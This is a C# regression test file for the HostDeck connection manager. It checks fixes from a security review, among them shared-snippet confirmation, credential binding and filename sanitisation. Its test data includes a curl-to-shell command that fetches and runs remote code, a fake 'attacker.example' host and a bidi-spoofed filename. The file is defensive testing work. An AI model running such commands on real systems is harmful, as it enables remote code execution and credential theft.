using System.Text.Json;
using HostDeck.Core.Model;
using HostDeck.Import.MRemoteNG;
using HostDeck.Presentation.Team;
using HostDeck.Presentation.ViewModels;
using HostDeck.Protocols.Ssh;
using HostDeck.Storage;
using static HostDeck.Tests.Presentation.MainViewModelTests;

namespace HostDeck.Tests;

/// <summary>Regressionstests zum unabhängigen Sicherheits-Review von Version 1.0.34.</summary>
public sealed class SecurityReview2Tests : IDisposable
{
    private readonly string _dir = Directory.CreateTempSubdirectory("hostdeck-sec2-").FullName;
    public void Dispose() { try { Directory.Delete(_dir, true); } catch (IOException) { } }

    private string TeamFile => Path.Combine(_dir, "confCons.xml");

    private void WriteTeam(string? password = null)
    {
        var t = new ConnectionTree();
        var srv = new FolderNode("Servers");
        srv.Add(new ConnectionNode("dc01") { Hostname = "10.0.0.1", Settings = { Protocol = ProtocolKind.Rdp, Password = "Shared!1" } });
        t.Root.Add(srv);
        new ConfConsExporter(new ConfConsExportOptions { MasterPassword = password }).ExportFile(t, TeamFile);
    }

    private (MainViewModel Vm, FakeDialogs Dialogs) User(string name, string? password = null)
    {
        var (vm, dialogs, _, store) = Create();
        store.Location = Path.Combine(_dir, name, "db");
        if (password is not null) dialogs.Passwords.Enqueue(password);
        Assert.True(vm.ConnectTeamLibraryAsync(TeamFile, false).GetAwaiter().GetResult());
        return (vm, dialogs);
    }

    private static FolderNode Servers(MainViewModel vm) => vm.TeamContainer!.Children.OfType<FolderNode>().Single();

    // ---- H1: Ordner bearbeiten bestätigt keine fremden Ziele ---------------------------------------

    [Fact]
    public void Editing_a_folder_does_not_trust_targets_a_colleague_added()
    {
        WriteTeam();
        var (me, dialogs) = User("me");
        var (evil, _) = User("evil");
        Servers(evil).Add(new ConnectionNode("dc02 (new)") { Hostname = "attacker.example", Settings = { Protocol = ProtocolKind.Rdp } });
        evil.Persist();
        Assert.True(evil.SyncTeam(write: true));
        Assert.True(me.SyncTeam(write: false));

        // Opfer weist dem Ordner sein RADIUS-Login zu (Eigenschaften-Dialog mit OK)
        var radius = me.SessionTree.Tree.Vault.Add(new Credential { Name = "RADIUS", Username = "me", Password = "MyRadius!1" });
        var folderItem = me.SessionTree.AllItems.Single(i => i.Node.Name == "Servers");
        dialogs.EditAnswer = e => { folderItem.Node.Settings.CredentialId = radius.Id; return true; };
        me.EditItemCommand.Execute(folderItem);

        // Verbinden mit dem neuen Eintrag: muss nachfragen – „Nein“ ⇒ Login wird nicht gesendet
        dialogs.ConfirmAnswer = false;
        var before = dialogs.ConfirmCalls;
        me.OpenCommand.Execute(me.SessionTree.AllItems.Single(i => i.Node.Name == "dc02 (new)"));
        Assert.Equal(before + 1, dialogs.ConfirmCalls);
        Assert.NotEqual("MyRadius!1", me.Workspace.ActiveTab!.Credentials.Password);
    }

    // ---- M2: abgeschwächte RDP-Sicherheit gehört zum Ziel ------------------------------------------

    [Fact]
    public void Turning_off_rdp_server_authentication_changes_the_bound_target()
    {
        var c = new ConnectionNode("dc01") { Hostname = "10.0.0.1", Settings = { Protocol = ProtocolKind.Rdp } };
        var secure = MainViewModel.TargetKey(c);
        Assert.Equal(3, secure.Count(ch => ch == '|'));        // sichere Einträge behalten ihren bisherigen Schlüssel
        c.Settings.Rdp.AuthenticationLevel = RdpAuthenticationLevel.NoAuth;
        Assert.NotEqual(secure, MainViewModel.TargetKey(c));
        c.Settings.Rdp.AuthenticationLevel = null;
        c.Settings.Rdp.UseCredSsp = false;
        Assert.NotEqual(secure, MainViewModel.TargetKey(c));
    }

    // ---- M3: Passwortschutz darf nicht still verschwinden -------------------------------------------

    [Fact]
    public void A_file_replaced_without_password_is_not_synced_or_rewritten_with_the_default_key()
    {
        WriteTeam(password: "Team-Secret#2026");
        var (me, dialogs) = User("me", "Team-Secret#2026");

        WriteTeam(password: null);                          // jemand ohne Passwort ersetzt die Datei
        dialogs.ConfirmAnswer = false;
        ((ConnectionNode)Servers(me).Children[0]).Hostname = "10.0.0.99";
        me.Persist();
        Assert.False(me.SyncTeam(write: true));
        Assert.Contains("password protection removed", me.TeamStatus);
        Assert.DoesNotContain("10.0.0.99", File.ReadAllText(TeamFile));
    }

    // ---- M1: Team-Snippets ----------------------------------------------------------------------------

    [Fact]
    public void Plaintext_snippet_file_is_rejected_when_the_library_has_a_password()
    {
        var path = Path.Combine(_dir, "x.hostdeck-snippets.json");
        File.WriteAllText(path, JsonSerializer.Serialize(new
        {
            Items = new[] { new { Id = Guid.NewGuid(), Name = "Disk usage", Command = "curl -s http://x/a|sh", Execute = true, ModifiedUtc = new DateTime(2099, 1, 1, 0, 0, 0, DateTimeKind.Utc) } },
        }));
        Assert.Throws<TeamSnippetPasswordException>(() => TeamSnippetFile.Read(path, "Team-Secret#2026"));
        var unprotected = Assert.Single(TeamSnippetFile.Read(path, null));
        Assert.True(unprotected.ModifiedUtc < DateTime.UtcNow.AddHours(1)); // „2099“ wird begrenzt
    }

    [Fact]
    public async Task Changed_shared_snippet_asks_before_it_is_sent()
    {
        WriteTeam();
        var (me, meDialogs) = User("me");
        var (other, _) = User("other");
        other.Snippets.Add("Shared check", "df -h", team: true);
        await other.SyncTeamSnippetsAsync();
        await me.SyncTeamSnippetsAsync();

        var snippet = me.Snippets.Items.Single(s => s.Name == "Shared check");
        meDialogs.ConfirmAnswer = false;
        var before = meDialogs.ConfirmCalls;
        me.Snippets.Run(snippet);
        Assert.Equal(before + 1, meDialogs.ConfirmCalls);   // erstes Ausführen: Befehl wird gezeigt

        meDialogs.ConfirmAnswer = true;
        me.Snippets.Run(snippet);
        before = meDialogs.ConfirmCalls;
        me.Snippets.Run(snippet);
        Assert.Equal(before, meDialogs.ConfirmCalls);       // bestätigt ⇒ keine erneute Frage

        // Kollege ändert den Befehl ⇒ wieder nachfragen
        var changed = other.Snippets.Items.Single(s => s.Name == "Shared check");
        changed.Command = "curl -s http://x/a | sh";
        other.Snippets.Save(changed);
        await other.SyncTeamSnippetsAsync();
        await me.SyncTeamSnippetsAsync();
        before = meDialogs.ConfirmCalls;
        me.Snippets.Run(me.Snippets.Items.Single(s => s.Name == "Shared check"));
        Assert.Equal(before + 1, meDialogs.ConfirmCalls);
    }

    // ---- M5 / L4: Schlüsseldatei ----------------------------------------------------------------------

    private sealed class FakeDevice : IDeviceKeyProtector
    {
        public string Id => "fake";
        public byte[] Protect(byte[] data) => data.Select(b => (byte)(b ^ 0x5A)).ToArray();
        public byte[] Unprotect(byte[] data) => Protect(data);
    }

    [Fact]
    public void Backups_cannot_be_opened_with_the_device_key()
    {
        var db = Path.Combine(_dir, "connections.hdk");
        using (var store = EncryptedConnectionStore.Create(db, "Korrekt-Pferd-Batterie", KdfParameters.FastForTests))
        {
            store.EnableDeviceUnlock(new FakeDevice());
            var backup = store.Backup(Path.Combine(_dir, "backups"));
            Assert.DoesNotContain("\"Device\"", File.ReadAllText(backup + ".key").Replace("\"Device\": null", ""), StringComparison.OrdinalIgnoreCase);
            Assert.Null(EncryptedConnectionStore.TryOpenWithDevice(backup, new FakeDevice()));
            using var viaPassword = EncryptedConnectionStore.Open(backup, "Korrekt-Pferd-Batterie");
        }
        using var original = EncryptedConnectionStore.TryOpenWithDevice(db, new FakeDevice());
        Assert.NotNull(original); // Original behält „auf diesem PC merken“
    }

    [Theory]
    [InlineData(2147483647, 3, 4)]
    [InlineData(65536, 3, 0)]
    [InlineData(65536, 0, 4)]
    public void Absurd_kdf_parameters_in_the_key_file_are_rejected(int memory, int iterations, int parallelism)
    {
        var db = Path.Combine(_dir, "connections.hdk");
        using (EncryptedConnectionStore.Create(db, "Korrekt-Pferd-Batterie", KdfParameters.FastForTests)) { }
        var key = db + ".key";
        var json = System.Text.Json.Nodes.JsonNode.Parse(File.ReadAllText(key))!;
        var kdf = json.AsObject().First(p => p.Key.Equals("kdf", StringComparison.OrdinalIgnoreCase)).Value!.AsObject();
        void Set(string name, int value) => kdf[kdf.First(p => p.Key.Equals(name, StringComparison.OrdinalIgnoreCase)).Key] = value;
        Set("memoryKiB", memory);
        Set("iterations", iterations);
        Set("parallelism", parallelism);
        File.WriteAllText(key, json.ToJsonString());
        Assert.Throws<InvalidDataException>(() => EncryptedConnectionStore.Open(db, "Korrekt-Pferd-Batterie"));
    }

    // ---- L7 / L8 ---------------------------------------------------------------------------------

    [Theory]
    [InlineData("invoice‮fdp.exe", "invoice_fdp.exe")]
    [InlineData("COM¹.txt", "_COM¹.txt")]
    public void Sftp_names_strip_bidi_controls_and_superscript_devices(string remote, string expected) =>
        Assert.Equal(expected, LocalFileNames.Sanitize(remote));

    [Fact]
    public void Lock_holder_text_from_the_share_is_sanitized()
    {
        Assert.Equal("bob@PC01", TeamLibraryFile.SanitizeHolder("bob@PC01"));
        Assert.Equal("ITsupportcallnow", TeamLibraryFile.SanitizeHolder("IT\nsupport: call now!"));
        Assert.Equal(64, TeamLibraryFile.SanitizeHolder(new string('a', 500)).Length);
    }
}
